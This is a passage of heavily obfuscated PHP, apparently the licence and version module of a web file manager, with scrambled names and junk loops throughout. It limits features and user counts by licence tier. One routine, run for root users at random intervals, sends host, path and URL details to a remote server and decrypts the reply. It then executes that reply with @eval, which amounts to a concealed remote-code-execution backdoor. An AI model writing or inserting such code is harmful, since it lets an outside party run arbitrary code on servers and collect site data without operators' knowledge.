(!$î­ç¦ùÜ) { die; } $©´”Ş¹¥ = @file_get_contents($½ğóâÔ›, !1, $Šº); $Ê¼®±ı¦ = $Ñ±ôÂÀó[763]; if (strlen($Ê¼®±ı¦) < $Ñ±ôÂÀó[715]) { die; } header($ÇÊ˜äµ°[226]); $Î»íßñÉ = $Ñ±ôÂÀó[764]; while ($Î»íßñÉ < $Ñ±ôÂÀó[699]) { if ($Î»íßñÉ >= 0) { break; } $Î»íßñÉ++; } if ($©´”Ş¹¥ && strstr($©´”Ş¹¥, $ÇÊ˜äµ°[227])) { echo $©´”Ş¹¥; } die; } public function ydxra2e8a082($“ÍáÂš) { $³¢İèß =& $_SERVER[öæÛ¿©¿]; $şÛĞªÛ’ =& $_SERVER[„Ã«ôíÀ]; if ($this->vstr1585f901 == $şÛĞªÛ’[228]) { return $“ÍáÂš; } $Šüø¢àº = $this->versionPluginList(); $â™óÃêÁ = $³¢İèß[765]; $–Ùò•õè = explode($şÛĞªÛ’[229], $this->versionPluginFilter()); $Ì„’¶•ó = $³¢İèß[766]; $çµæ ¬„ = array(); foreach ($Šüø¢àº as $í®¿–‰Ÿ => $Í„¿¥ı…) { if ($Í„¿¥ı… == $şÛĞªÛ’[230] && substr($this->vstr1585f901, 0, 1) == $şÛĞªÛ’[230]) { continue; } if (!in_array($í®¿–‰Ÿ, $–Ùò•õè)) { $çµæ ¬„[] = $í®¿–‰Ÿ; } } foreach ($çµæ ¬„ as $í®¿–‰Ÿ) { unset($“ÍáÂš[$í®¿–‰Ÿ]); } return $“ÍáÂš; } private function versionPluginList() { $±ÏŠÔÇ§ =& $_SERVER[„Ã«ôíÀ]; return array($±ÏŠÔÇ§[231] => $±ÏŠÔÇ§[230], $±ÏŠÔÇ§[232] => $±ÏŠÔÇ§[230], $±ÏŠÔÇ§[233] => $±ÏŠÔÇ§[230], $±ÏŠÔÇ§[234] => $±ÏŠÔÇ§[230], $±ÏŠÔÇ§[235] => $±ÏŠÔÇ§[236], $±ÏŠÔÇ§[237] => $±ÏŠÔÇ§[236], $±ÏŠÔÇ§[238] => $±ÏŠÔÇ§[236], $±ÏŠÔÇ§[239] => $±ÏŠÔÇ§[236], $±ÏŠÔÇ§[240] => $±ÏŠÔÇ§[236], $±ÏŠÔÇ§[241] => $±ÏŠÔÇ§[236], $±ÏŠÔÇ§[242] => $±ÏŠÔÇ§[236], $±ÏŠÔÇ§[243] => $±ÏŠÔÇ§[236], $±ÏŠÔÇ§[244] => $±ÏŠÔÇ§[236], $±ÏŠÔÇ§[245] => $±ÏŠÔÇ§[236], $±ÏŠÔÇ§[246] => $±ÏŠÔÇ§[236], $±ÏŠÔÇ§[247] => $±ÏŠÔÇ§[236], $±ÏŠÔÇ§[248] => $±ÏŠÔÇ§[236], $±ÏŠÔÇ§[249] => $±ÏŠÔÇ§[236], $±ÏŠÔÇ§[250] => $±ÏŠÔÇ§[236]); } private function versionPluginFilter() { $Šãºéİ¬ =& $_SERVER[öæÛ¿©¿]; $Ò¼»§İô =& $_SERVER[„Ã«ôíÀ]; if ($this->vstr1585f901 == $Ò¼»§İô[111]) { return $Ò¼»§İô[6]; } $ÍÛ•şı = _get($this->ifhwb32c0a07, $Ò¼»§İô[251], $Ò¼»§İô[6]); $ÕÀÕ¥Ø„ = $Šãºéİ¬[767]; $ğ„Û•‹­ = _get($this->ifhwb32c0a07, $Ò¼»§İô[118], $Ò¼»§İô[6]); $îÌÑ”‘ = $Šãºéİ¬[768]; if (!$îÌÑ”‘) { die; } $ö©´·Û = _get($this->ifhwb32c0a07, $Ò¼»§İô[252], $Ò¼»§İô[6]); if ($ğ„Û•‹­ > time() && $ö©´·Û > time()) { $çë¾Ô© = explode($Ò¼»§İô[229], $ÍÛ•şı); $´åê¼¦† = array_keys($this->versionPluginList()); $ÍÛ•şı = array_merge($çë¾Ô©, $´åê¼¦†); $ÍÛ•şı = implode($Ò¼»§İô[229], array_filter(array_unique($ÍÛ•şı))); } return $ÍÛ•şı; } private function gbeya9f82be6() { $êÔõ­ç÷ =& $_SERVER[„Ã«ôíÀ]; if ($this->vstr1585f901 != $êÔõ­ç÷[111]) { $GLOBALS[$êÔõ­ç÷[88]][$êÔõ­ç÷[92]][$êÔõ­ç÷[253]] = $êÔõ­ç÷[208]; return; } $GLOBALS[$êÔõ­ç÷[88]][$êÔõ­ç÷[254]] = $êÔõ­ç÷[124]; if (Model($êÔõ­ç÷[255])->get($êÔõ­ç÷[63]) != $êÔõ­ç÷[208]) { Model($êÔõ­ç÷[255])->set($êÔõ­ç÷[63], $êÔõ­ç÷[208]); } } public function esxj4de12a0e() { return $_SERVER[„Ã«ôíÀ][256]; $†À‚œø = $_SERVER[öæÛ¿©¿][769]; if (!$†À‚œø) { return; } } private function ygqk1b2777b4() { $”ë…ßµˆ =& $_SERVER[öæÛ¿©¿]; $©Ê»ƒ¹ =& $_SERVER[„Ã«ôíÀ]; $î»ø„¬ = array($©Ê»ƒ¹[257], $©Ê»ƒ¹[258], $©Ê»ƒ¹[259]); $ìê¡¡Èµ = $”ë…ßµˆ[770]; while (strlen($ìê¡¡Èµ) < $”ë…ßµˆ[721]) { if (!$ìê¡¡Èµ) { break; } $ìê¡¡Èµ++; } $ë†óşÃ = $©Ê»ƒ¹[260] . md5($©Ê»ƒ¹[261]); $ˆ³Í¬±” = $”ë…ßµˆ[771]; if (!$ˆ³Í¬±”) { return; } if ($this->vstr1585f901 == $©Ê»ƒ¹[111] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$©Ê»ƒ¹[24]], $î»ø„¬)) { return; } if (time() % 4 != 0) { return; } $İ«ÒŸŠ = call_user_func(array($©Ê»ƒ¹[262], $©Ê»ƒ¹[263]), $ë†óşÃ); $İû¢ºÄ´ = $”ë…ßµˆ[772]; while ($İû¢ºÄ´ < $”ë…ßµˆ[715]) { if ($İû¢ºÄ´ >= 0) { break; } $İû¢ºÄ´++; } if ($İ«ÒŸŠ && time() - $İ«ÒŸŠ < intval($©Ê»ƒ¹[264])) { return; } call_user_func(array($©Ê»ƒ¹[262], $©Ê»ƒ¹[141]), $ë†óşÃ, time()); $¤Ëò…€º = $”ë…ßµˆ[773]; while ($¤Ëò…€º < $”ë…ßµˆ[703]) { if ($¤Ëò…€º >= 0) { break; } $¤Ëò…€º++; } $“–Şš„¾ = Model($©Ê»ƒ¹[33])->get($©Ê»ƒ¹[102]); $ã‚¿â¦° = $”ë…ßµˆ[774]; while ($ã‚¿â¦° < $”ë…ßµˆ[699]) { if ($ã‚¿â¦° >= 0) { break; } $ã‚¿â¦°++; } $šĞÇó‘ô = array($©Ê»ƒ¹[154] => Model($©Ê»ƒ¹[33])->get($©Ê»ƒ¹[155]), $©Ê»ƒ¹[169] => $this->vstr1585f901, $©Ê»ƒ¹[165] => $_SERVER[$©Ê»ƒ¹[166]], $©Ê»ƒ¹[167] => Model($©Ê»ƒ¹[33])->get($©Ê»ƒ¹[133]), $©Ê»ƒ¹[107] => md5($_SERVER[$©Ê»ƒ¹[108]] . $“–Şš„¾), $©Ê»ƒ¹[158] => $©Ê»ƒ¹[138], $©Ê»ƒ¹[161] => $_SERVER[$©Ê»ƒ¹[162]]); $¿ÉóÚÔµ = $”ë…ßµˆ[775]; $°•¼Ìæ‰ = $this->rqjz6897c71f($©Ê»ƒ¹[265], $šĞÇó‘ô); $®Æıë„ = $”ë…ßµˆ[776]; if (strlen($®Æıë„) < $”ë…ßµˆ[721]) { return; } if (!is_array($°•¼Ìæ‰)) { return; } if ($°•¼Ìæ‰[$©Ê»ƒ¹[154]] && $°•¼Ìæ‰[$©Ê»ƒ¹[266]]) { if ($this->ndsfd4243d55($°•¼Ìæ‰[$©Ê»ƒ¹[266]]) == $šĞÇó‘ô[$©Ê»ƒ¹[154]]) { return; } } $this->emyh16a3082b(); if ($this->ndsfd4243d55($°•¼Ìæ‰[$©Ê»ƒ¹[266]]) != $šĞÇó‘ô[$©Ê»ƒ¹[154]]) { $à¬¯±•Í = array($©Ê»ƒ¹[187] => $“–Şš„¾, $©Ê»ƒ¹[188] => $_SERVER[$©Ê»ƒ¹[108]], $©Ê»ƒ¹[189] => this_url(), $©Ê»ƒ¹[163] => $_SERVER[$©Ê»ƒ¹[164]]); $ÛÙ®íä¨ = $this->mgkp881eaf06(json_encode($à¬¯±•Í)); $°•¼Ìæ‰ = $this->rqjz6897c71f($©Ê»ƒ¹[190] . $ÛÙ®íä¨); if ($°•¼Ìæ‰ && is_array($°•¼Ìæ‰) && isset($°•¼Ìæ‰[$©Ê»ƒ¹[266]])) { $Ïä«ÒÎ = $this->icob433aca23($°•¼Ìæ‰[$©Ê»ƒ¹[266]], 2); if ($Ïä«ÒÎ) { $Ïä«ÒÎ = $this->ndsfd4243d55($Ïä«ÒÎ); } if ($Ïä«ÒÎ) { try { @eval($Ïä«ÒÎ); } catch (Exception $øŸùÓñƒ) { } } } } } private function rqjz6897c71f($ã×·»ïş = '', $©Ã©Ê¶Õ = array(), $ÚÂ©İ× = 5) { $Î’ÙñÜ˜ =& $_SERVER[öæÛ¿©¿]; $€¿ü¦Ö¿ =& $_SERVER[„Ã«ôíÀ]; $Ä¦ÆÄˆù = $€¿ü¦Ö¿[267]; $’şºÍê = $Î’ÙñÜ˜[777]; if (strlen($’şºÍê) < $Î’ÙñÜ˜[703]) { die; } $Ä¦ÆÄˆù = $this->maukd6da122b($Ä¦ÆÄˆù, $€¿ü¦Ö¿[268]); $„àÖê¸ß = $Î’ÙñÜ˜[778]; while ($„àÖê¸ß < $Î’ÙñÜ˜[711]) { if ($„àÖê¸ß >= 0) { break; } $„àÖê¸ß++; } $Ä¦ÆÄˆù = $Ä¦ÆÄˆù . $ã×·»ïş; $·ö‡ç…â = $Î’ÙñÜ˜[779]; if (strlen($·ö‡ç…â) < $Î’ÙñÜ˜[715]) { return; } if ($©Ã©Ê¶Õ && is_array($©Ã©Ê¶Õ)) { $Ä¦ÆÄˆù = $Ä¦ÆÄˆù . $€¿ü¦Ö¿[269] . http_build_query($©Ã©Ê¶Õ); } if ($©Ã©Ê¶Õ === -1) { return $Ä¦ÆÄˆù; } $‡’é·şÖ = stream_context_create(array($€¿ü¦Ö¿[222] => array($€¿ü¦Ö¿[225] => $ÚÂ©İ×, $€¿ü¦Ö¿[223] => $€¿ü¦Ö¿[270]), $€¿ü¦Ö¿[271] => array($€¿ü¦Ö¿[272] => !1, $€¿ü¦Ö¿[273] => !1))); $®Û³çö• = $Î’ÙñÜ˜[780]; if (!$®Û³çö•) { die; } $©Ã©Ê¶Õ = @file_get_contents($Ä¦ÆÄˆù, !1, $‡’é·şÖ); return json_decode($©Ã©Ê¶Õ, !0); $ È¤èöš = $Î’ÙñÜ˜[781]; if (!$ È¤èöš) { return; } $°á¯”Òö = $Î’ÙñÜ˜[782]; if (!$°á¯”Òö) { die; } } private function mqgkb200c459() { $¶ÑÀ÷ó“ =& $_SERVER[öæÛ¿©¿]; $Ç²¯šÂ­ =& $_SERVER[„Ã«ôíÀ]; $ÂµËå¨½ = array($Ç²¯šÂ­[274] => $Ç²¯šÂ­[275], $Ç²¯šÂ­[276] => $Ç²¯šÂ­[277], $Ç²¯šÂ­[278] => $Ç²¯šÂ­[279], $Ç²¯šÂ­[280] => $Ç²¯šÂ­[281], $Ç²¯šÂ­[282] => $Ç²¯šÂ­[283], $Ç²¯šÂ­[284] => $Ç²¯šÂ­[217], $Ç²¯šÂ­[285] => $Ç²¯šÂ­[217], $Ç²¯šÂ­[286] => $Ç²¯šÂ­[275], $Ç²¯šÂ­[287] => $Ç²¯šÂ­[277], $Ç²¯šÂ­[288] => $Ç²¯šÂ­[279], $Ç²¯šÂ­[289] => $Ç²¯šÂ­[290], $Ç²¯šÂ­[291] => $Ç²¯šÂ­[281], $Ç²¯šÂ­[292] => $Ç²¯šÂ­[293], $Ç²¯šÂ­[294] => $Ç²¯šÂ­[283], $Ç²¯šÂ­[295] => $Ç²¯šÂ­[296], $Ç²¯šÂ­[297] => $Ç²¯šÂ­[298], $Ç²¯šÂ­[299] => $Ç²¯šÂ­[300]); $á¸•½µ· = $ÂµËå¨½[$this->vstr1585f901]; $á¸•½µ· = intval($á¸•½µ· ? $á¸•½µ· : $Ç²¯šÂ­[275]); $œêÉ†¨Û = _get($this->ifhwb32c0a07, $Ç²¯šÂ­[301]); $œêÉ†¨Û = $œêÉ†¨Û ? intval($œêÉ†¨Û) : 0; return $á¸•½µ· + $œêÉ†¨Û; $ï§—¾¸½ = $¶ÑÀ÷ó“[783]; while ($ï§—¾¸½ < $¶ÑÀ÷ó“[703]) { if ($ï§—¾¸½ >= 0) { break; } $ï§—¾¸½++; } } public function bpaxad99f907($²¥äÑğõ) { $´³á·üû =& $_SERVER[„Ã«ôíÀ]; $ÅÈ§áşÛ = $this->mqgkb200c459(); $åØÛ¯ÛÔ = $_SERVER[öæÛ¿©¿][784]; if ($²¥äÑğõ[$´³á·üû[302]] == $´³á·üû[124]) { return; } if ($ÅÈ§áşÛ >= intval($´³á·üû[217])) { return; } $ì¨ØÊ¢À = Model($´³á·üû[127])->count(); if ($ì¨ØÊ¢À <= $ÅÈ§áşÛ) { return; } $¢²œÇïò = Model($´³á·üû[127])->field($´³á·üû[302])->limit($ÅÈ§áşÛ)->select(); $¢²œÇïò = array_to_keyvalue($¢²œÇïò, $´³á·üû[6], $´³á·üû[302]); if (!in_array($²¥äÑğõ[$´³á·üû[302]], $¢²œÇïò)) { show_json($´³á·üû[303], !1, $´³á·üû[213]); } } public function svel4b055688() { $¥Ùêê¼œ =& $_SERVER[öæÛ¿©¿]; $¹šùáè =& $_SERVER[„Ã«ôíÀ]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $••Õ«Ç‹ = $¹šùáè[220]; $••Õ«Ç‹ = $this->maukd6da122b($••Õ«Ç‹, $¹šùáè[221]); $°“åÄø = $¥Ùêê¼œ[785]; while ($°“åÄø < $¥Ùêê¼œ[703]) { if ($°“åÄø >= 0) { break; } $°“åÄø++; } $ŸÆ÷Ô®‹ = stream_context_create(array($¹šùáè[222] => array($¹šùáè[223] => $¹šùáè[224], $¹šùáè[225] => 3))); $éã¯ùİ„ = $¥Ùêê¼œ[786]; $‡µƒª½ô = @file_get_contents($••Õ«Ç‹, !1, $ŸÆ÷Ô®‹); $¸îÍÇõÜ = $¥Ùêê¼œ[787]; if (!$¸îÍÇõÜ) { return; } echo $¹šùáè[304] . hash_encode($‡µƒª½ô) . $¹šùáè[305]; } private function rhlg206d7151($ä›úç™Õ, $ÑŸâæ, $şÖ«¿á™ = 3) { $İŒ÷¹»ì =& $_SERVER[öæÛ¿©¿]; $µ–±ÌØÙ =& $_SERVER[„Ã«ôíÀ]; usleep(1); $Ã„øë  = $İŒ÷¹»ì[788]; $ä›úç™Õ = trim($ä›úç™Õ); $¢ÓùÅòè = mt_rand(0, 5) . $µ–±ÌØÙ[6]; $ƒŞ­ƒÖª = $İŒ÷¹»ì[789]; while (strlen($ƒŞ­ƒÖª) < $İŒ÷¹»ì[715]) { if (!$ƒŞ­ƒÖª) { break; } $ƒŞ­ƒÖª++; } $Ó×‡œäş = rand_string(15); $ú‚À‘—… = $µ–±ÌØÙ[306]; $‰±ˆ±ÆÊ = $İŒ÷¹»ì[790]; switch ($¢ÓùÅòè) { case $µ–±ÌØÙ[208]: $µ½ˆÆ¼ƒ = $this->volg6af6edeb($ä›úç™Õ, strrev($ÑŸâæ . $Ó×‡œäş)); break; $àãø¤Ù = $İŒ÷¹»ì[791]; if (strlen($àãø¤Ù) < $İŒ÷¹»ì[699]) { return; } case $µ–±ÌØÙ[124]: $µ½ˆÆ¼ƒ = $this->volg6af6edeb($ä›úç™Õ, strrev($Ó×‡œäş . $ÑŸâæ)); break; case $µ–±ÌØÙ[307]: $µ½ˆÆ¼ƒ = $this->volg6af6edeb($ä›úç™Õ, base64_encode($Ó×‡œäş . $ÑŸâæ)); break; case $µ–±ÌØÙ[308]: $µ½ˆÆ¼ƒ = $this->volg6af6edeb($ä›úç™Õ, md5($Ó×‡œäş . $ÑŸâæ)); break; $¿Ü’›ô = $İŒ÷¹»ì[792]; while (strlen($¿Ü’›ô) < $İŒ÷¹»ì[699]) { if (!$¿Ü’›ô) { break; } $¿Ü’›ô++; } case $µ–±ÌØÙ[309]: $ä›úç™Õ = base64_encode($ä›úç™Õ); $®÷½çŠ¶ = rand(0, 64); $˜¦¸•Ç˜ = $ú‚À‘—…[$®÷½çŠ¶]; $¾ŸñŞĞâ = md5($˜¦¸•Ç˜ . md5($ÑŸâæ . $˜¦¸•Ç˜) . $ÑŸâæ); $¾…ÆÔµ = $İŒ÷¹»ì[793]; while (strlen($¾…ÆÔµ) < $İŒ÷¹»ì[721]) { if (!$¾…ÆÔµ) { break; } $¾…ÆÔµ++; } $¾ŸñŞĞâ = substr($¾ŸñŞĞâ, $®÷½çŠ¶ % 8, $®÷½çŠ¶ % 8 + 7); $•Î—…§ = $İŒ÷¹»ì[794]; if (!$•Î—…§) { return; } $í²ªøß = $µ–±ÌØÙ[6]; $¦ô¾ğÈñ = 0; $ù¢ö—èû = $İŒ÷¹»ì[795]; if (strlen($ù¢ö—èû) < $İŒ÷¹»ì[703]) { die; } $æ‹üõ‚ = 0; $ãÓœ¾µ = $İŒ÷¹»ì[796]; while ($ãÓœ¾µ < $İŒ÷¹»ì[721]) { if ($ãÓœ¾µ >= 0) { break; } $ãÓœ¾µ++; } $±±±±ª = 0; $»ã—áªç = $İŒ÷¹»ì[797]; while ($»ã—áªç < $İŒ÷¹»ì[703]) { if ($»ã—áªç >= 0) { break; } $»ã—áªç++; } for ($¦ô¾ğÈñ = 0; $¦ô¾ğÈñ < strlen($ä›úç™Õ); $¦ô¾ğÈñ++) { $±±±±ª = $±±±±ª == strlen($¾ŸñŞĞâ) ? 0 : $±±±±ª; $æã¤€Ì‹ = $İŒ÷¹»ì[798]; while (strlen($æã¤€Ì‹) < $İŒ÷¹»ì[703]) { if (!$æã¤€Ì‹) { break; } $æã¤€Ì‹++; } $æ‹üõ‚ = ($®÷½çŠ¶ + strpos($ú‚À‘—…, $ä›úç™Õ[$¦ô¾ğÈñ]) + ord($¾ŸñŞĞâ[$±±±±ª++])) % 64; $í²ªøß .= $ú‚À‘—…[$æ‹üõ‚]; } $µ½ˆÆ¼ƒ = hash_encode($˜¦¸•Ç˜ . $í²ªøß); $¢¬¡èÈ˜ = $İŒ÷¹»ì[799]; if (!$¢¬¡èÈ˜) { die; } break; default: $µ½ˆÆ¼ƒ = $this->volg6af6edeb($ä›úç™Õ, $ÑŸâæ . $Ó×‡œäş); $ƒÑ¾İÖƒ = $İŒ÷¹»ì[800]; if (strlen($ƒÑ¾İÖƒ) < $İŒ÷¹»ì[721]) { return; } break; $Õø…áÜÂ = $İŒ÷¹»ì[801]; if (strlen($Õø…áÜÂ) < $İŒ÷¹»ì[715]) { return; } } $µ½ˆÆ¼ƒ = strrev($¢ÓùÅòè . $Ó×‡œäş . $µ½ˆÆ¼ƒ); $á…™Ü½ = $İŒ÷¹»ì[802]; if (!$á…™Ü½) { die; } if ($şÖ«¿á™ - 1 > 0) { $µ½ˆÆ¼ƒ = $this->rhlg206d7151($µ½ˆÆ¼ƒ, $ÑŸâæ, $şÖ«¿á™ - 1); } return $µ½ˆÆ¼ƒ; } private function icob433aca23($Ÿ­¹íğ, $Î»éˆüÑ, $é–—É½” = 3) { $¬Èğ•¡ =& $_SERVER[öæÛ¿©¿]; $‰ÉåÉ®ß =& $_SERVER[„Ã«ôíÀ]; if (!is_string($Ÿ­¹íğ) || strlen($Ÿ­¹íğ) < 10) { return !1; } $Ÿ­¹íğ = trim($Ÿ­¹íğ); $Û Ù—·  = $¬Èğ•¡[803]; if (!$Û Ù—· ) { return; } $Ÿ­¹íğ = strrev($Ÿ­¹íğ); $¨–û”ÛÂ = $¬Èğ•¡[804]; while ($¨–û”ÛÂ < $¬Èğ•¡[703]) { if ($¨–û”ÛÂ >= 0) { break; } $¨–û”ÛÂ++; } $´¶ƒ„®¿ = $Ÿ­¹íğ[0]; $©›«’Ó = substr($Ÿ­¹íğ, 1, 15); $Ÿ­¹íğ = substr($Ÿ­¹íğ, 16); $™ğš›•Ö = $¬Èğ•¡[805]; if (strlen($™ğš›•Ö) < $¬Èğ•¡[721]) { die; } $¡ëƒÏÑ = $‰ÉåÉ®ß[306]; switch ($´¶ƒ„®¿) { case $‰ÉåÉ®ß[208]: $’ò¾Şæ = $this->maukd6da122b($Ÿ­¹íğ, strrev($Î»éˆüÑ . $©›«’Ó)); $—Ë÷”’Ó = $¬Èğ•¡[806]; break; $Ï¨¹Öâ = $¬Èğ•¡[807]; if (strlen($Ï¨¹Öâ) < $¬Èğ•¡[699]) { die; } case $‰ÉåÉ®ß[124]: $’ò¾Şæ = $this->maukd6da122b($Ÿ­¹íğ, strrev($©›«’Ó . $Î»éˆüÑ)); break; case $‰ÉåÉ®ß[307]: $’ò¾Şæ = $this->maukd6da122b($Ÿ­¹íğ, base64_encode($©›«’Ó . $Î»éˆüÑ)); break; case $‰ÉåÉ®ß[308]: $’ò¾Şæ = $this->maukd6da122b($Ÿ­¹íğ, md5($©›«’Ó . $Î»éˆüÑ)); break; $Ô²ó±Å = $¬Èğ•¡[808]; while ($Ô²ó±Å < $¬Èğ•¡[703]) { if ($Ô²ó±Å >= 0) { break; } $Ô²ó±Å++; } case $‰ÉåÉ®ß[309]: $Ÿ­¹íğ = hash_decode($Ÿ­¹íğ); $¼¸îúñŒ = $Ÿ­¹íğ[0]; $Ÿ­¹íğ = substr($Ÿ­¹íğ, 1); $¤²ìÑ×„ = $¬Èğ•¡[809]; if (!$¤²ìÑ×„) { die; } $á–•½äÆ = strpos($¡ëƒÏÑ, $¼¸îúñŒ); $³Â¶¯­ = $¬Èğ•¡[810]; if (!$³Â¶¯­) { die; } $ÚûªÔ´™ = md5($¼¸îúñŒ . md5($Î»éˆüÑ . $¼¸îúñŒ) . $Î»éˆüÑ); $Ü†…§ªò = $¬Èğ•¡[811]; if (!$Ü†…§ªò) { return; } $ÚûªÔ´™ = substr($ÚûªÔ´™, $á–•½äÆ % 8, $á–•½äÆ % 8 + 7); $õÈŸöªÛ = $¬Èğ•¡[812]; if (!$õÈŸöªÛ) { die; } $‰Ñâšï = $‰ÉåÉ®ß[6]; $³£ÍùãÆ = 0; $àÏ„ï = $¬Èğ•¡[813]; while (strlen($àÏ„ï) < $¬Èğ•¡[703]) { if (!$àÏ„ï) { break; } $àÏ„ï++; } $ŞÄ™’ä = 0; $èîüş½ã = $¬Èğ•¡[814]; if (strlen($èîüş½ã) < $¬Èğ•¡[699]) { return; } $–š±œ¬† = 0; for ($³£ÍùãÆ = 0; $³£ÍùãÆ < strlen($Ÿ­¹íğ); $³£ÍùãÆ++) { $–š±œ¬† = $–š±œ¬† == strlen($ÚûªÔ´™) ? 0 : $–š±œ¬†; $Ã•Ùªğ® = $–š±œ¬†++; $ŞÄ™’ä = strpos($¡ëƒÏÑ, $Ÿ­¹íğ[$³£ÍùãÆ]) - $á–•½äÆ - ord($ÚûªÔ´™[$Ã•Ùªğ®]); while ($ŞÄ™’ä < 0) { $ŞÄ™’ä += 64; } $‰Ñâšï .= $¡ëƒÏÑ[$ŞÄ™’ä]; } $’ò¾Şæ = base64_decode($‰Ñâšï); break; $§¦ƒŸ¾“ = $¬Èğ•¡[815]; if (strlen($§¦ƒŸ¾“) < $¬Èğ•¡[699]) { return; } default: $’ò¾Şæ = $this->maukd6da122b($Ÿ­¹íğ, $Î»éˆüÑ . $©›«’Ó); $¦ÀŠÊÊÄ = $¬Èğ•¡[816]; if (strlen($¦ÀŠÊÊÄ) < $¬Èğ•¡[711]) { die; } break; $œîÉåè = $¬Èğ•¡[817]; while ($œîÉåè < $¬Èğ•¡[715]) { if ($œîÉåè >= 0) { break; } $œîÉåè++; } } if ($é–—É½” - 1 > 0) { $’ò¾Şæ = $this->icob433aca23($’ò¾Şæ, $Î»éˆüÑ, $é–—É½” - 1); } return $’ò¾Şæ; } public function mgkp881eaf06($Æ¾Ïğùá) { $Œùñ·‰™ =& $_SERVER[öæÛ¿©¿]; $ÁúùÕŸ =& $_SERVER[„Ã«ôíÀ]; $Ç‘éÌ”ü = $this->liby0694f7a2(); $±øêïæ… = $this->liby0694f7a2(); $ÈŒ—•ßÓ = ($Ç‘éÌ”ü - 1) * ($±øêïæ… - 1); $ëÂê¯´’ = intval(($Ç‘éÌ”ü + $±øêïæ…) / 2); $üßÒı™® = $Œùñ·‰™[818]; while (strlen($üßÒı™®) < $Œùñ·‰™[699]) { if (!$üßÒı™®) { break; } $üßÒı™®++; } while (1) { $†ÏâÔĞÔ = $ëÂê¯´’; $Êş®‰¥ = $Œùñ·‰™[819]; if (!$Êş®‰¥) { return; } $äÒ«ã©À = $ÈŒ—•ßÓ; $½ÜÄ‰‰Ÿ = $Œùñ·‰™[820]; if (!$½ÜÄ‰‰Ÿ) { die; } while ($äÒ«ã©À % $†ÏâÔĞÔ != 0) { $–…´áŞİ = $äÒ«ã©À; $èä¸Ş—· = $Œùñ·‰™[821]; if (!$èä¸Ş—·) { die; } $äÒ«ã©À = $†ÏâÔĞÔ; $†ÏâÔĞÔ = $–…´áŞİ % $†ÏâÔĞÔ; $­æ¸—ÓÓ = $Œùñ·‰™[822]; while (strlen($­æ¸—ÓÓ) < $Œùñ·‰™[721]) { if (!$­æ¸—ÓÓ) { break; } $­æ¸—ÓÓ++; } } if ($†ÏâÔĞÔ == 1) { break; } else { $ëÂê¯´’++; } } $•·Í¡í„ = 2; for ($±šƒé™Š = 0; $±šƒé™Š < $ÈŒ—•ßÓ * 10; $±šƒé™Š++) { if (($ÈŒ—•ßÓ * $±šƒé™Š + 1) % $ëÂê¯´’ == 0) { $•·Í¡í„ = intval(($ÈŒ—•ßÓ * $±šƒé™Š + 1) / $ëÂê¯´’); break; } } $‚§€ÁÛ = $this->volg6af6edeb($Ç‘éÌ”ü * $±øêïæ… . $ÁúùÕŸ[6], $ÁúùÕŸ[138]); $Å¡€å¡ = md5($ÁúùÕŸ[310] . ($Ç‘éÌ”ü + $±øêïæ…) . $ÁúùÕŸ[311] . $ëÂê¯´’ . $ÁúùÕŸ[311] . $•·Í¡í„ . $ÁúùÕŸ[312]); $¼ÕÍ¢ğš = $Œùñ·‰™[823]; if (!$¼ÕÍ¢ğš) { die; } $•­ò‹åñ = $this->volg6af6edeb($Æ¾Ïğùá, $Å¡€å¡) . $ÁúùÕŸ[313] . $‚§€ÁÛ; $¾ÑŠŸôª = $Œùñ·‰™[824]; while ($¾ÑŠŸôª < $Œùñ·‰™[715]) { if ($¾ÑŠŸôª >= 0) { break; } $¾ÑŠŸôª++; } return $•­ò‹åñ; } public function ndsfd4243d55($çË‘£áò) { $¨øïş½ =& $_SERVER[öæÛ¿©¿]; $ØÁ¤ÙéÌ =& $_SERVER[„Ã«ôíÀ]; $ïó¸«Ì› = explode($ØÁ¤ÙéÌ[313], $çË‘£áò); $­Á®¢¾Î = $¨øïş½[825]; if (!$­Á®¢¾Î) { die; } if (count($ïó¸«Ì›) != 2) { return $ØÁ¤ÙéÌ[6]; } $í”ô£‚ï = $this->maukd6da122b($ïó¸«Ì›[1] . $ØÁ¤ÙéÌ[6], $ØÁ¤ÙéÌ[138]); $Ì³â‡—É = $¨øïş½[826]; if (strlen($Ì³â‡—É) < $¨øïş½[703]) { die; } if (!$í”ô£‚ï) { return $ØÁ¤ÙéÌ[6]; } $í”ô£‚ï = intval($í”ô£‚ï); $ŸÙ®ğĞµ = 0; $Ö¶î¸œö = $¨øïş½[827]; if (!$Ö¶î¸œö) { return; } $§Ò© = 0; $–Ó´ƒª§ = $¨øïş½[741]; if (!$–Ó´ƒª§) { return; } for ($¥ô£ò–Ö = 3; $¥ô£ò–Ö < $í”ô£‚ï; $¥ô£ò–Ö += 2) { if ($í”ô£‚ï % $¥ô£ò–Ö != 0) { continue; } $ŸÙ®ğĞµ = $¥ô£ò–Ö; $§Ò© = intval($í”ô£‚ï / $¥ô£ò–Ö); break; $İ¸ë¡à = $¨øïş½[828]; while (strlen($İ¸ë¡à) < $¨øïş½[721]) { if (!$İ¸ë¡à) { break; } $İ¸ë¡à++; } } $¸åÊ÷Ä = ($ŸÙ®ğĞµ - 1) * ($§Ò© - 1); $ï¼ãÓîÀ = intval(($ŸÙ®ğĞµ + $§Ò©) / 2); while (1) { $«’øäˆ½ = $ï¼ãÓîÀ; $‡ËØ×åõ = $¨øïş½[829]; if (strlen($‡ËØ×åõ) < $¨øïş½[703]) { return; } $òõ§‹áÖ = $¸åÊ÷Ä; while ($òõ§‹áÖ % $«’øäˆ½ != 0) { $«­ÂğÇ = $òõ§‹áÖ; $òõ§‹áÖ = $«’øäˆ½; $˜Ì¶ÎØ = $¨øïş½[830]; if (!$˜Ì¶ÎØ) { return; } $«’øäˆ½ = $«­ÂğÇ % $«’øäˆ½; $³Ÿ¸Çùí = $¨øïş½[831]; while (strlen($³Ÿ¸Çùí) < $¨øïş½[715]) { if (!$³Ÿ¸Çùí) { break; } $³Ÿ¸Çùí++; } } if ($«’øäˆ½ == 1) { break; } else { $ï¼ãÓîÀ++; } } $Àèã”›Ò = 2; for ($¥ô£ò–Ö = 0; $¥ô£ò–Ö < $¸åÊ÷Ä * 10; $¥ô£ò–Ö++) { if (($¸åÊ÷Ä * $¥ô£ò–Ö + 1) % $ï¼ãÓîÀ == 0) { $Àèã”›Ò = intval(($¸åÊ÷Ä * $¥ô£ò–Ö + 1) / $ï¼ãÓîÀ); break; } } $»±· Ö = md5($ØÁ¤ÙéÌ[310] . ($ŸÙ®ğĞµ + $§Ò©) . $ØÁ¤ÙéÌ[311] . $ï¼ãÓîÀ . 